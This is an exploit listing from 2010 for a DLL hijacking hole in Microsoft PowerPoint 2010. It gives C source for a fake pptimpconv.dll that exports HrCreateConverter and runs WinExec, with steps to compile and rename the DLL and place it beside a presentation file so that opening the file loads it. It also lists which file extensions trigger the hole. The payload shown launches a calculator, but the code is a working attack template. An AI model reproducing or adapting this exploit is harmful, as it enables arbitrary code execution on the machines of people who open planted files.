/*
Exploit Title: Microsoft PowerPoint 2010 DLL Hijacking Exploit (pptimpconv.dll)
Date: 24/08/2010
Author: TheLeader
Email: gsog2009 [a7] hotmail [d0t] com
Software Link: http://office.microsoft.com/en-us/powerpoint/
Version: 14.0.4760.1000
Tested on: Windows 7 x86 (6.1.7600)

Compile and rename to pptimpconv.dll, create a file in the same dir with one of the following extensions:
.odp / .pot / .potm / .potx / .ppa / .pps / .ppsm / .ppsx / .ppt / .pptm / .pptx / .pwz / .sldm / .sldx

This exploit does _not_ get triggered with the following file extensions:
.pothtml / .ppam / .ppthtml / .pptxml / .thmx

Double click & watch a nice calculator pop =]
*More shouts* to all the great guys at forums.hacking.org.il
*/

#include <windows.h>
#define DLLIMPORT __declspec (dllexport)

DLLIMPORT void HrCreateConverter() { evil(); }

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}
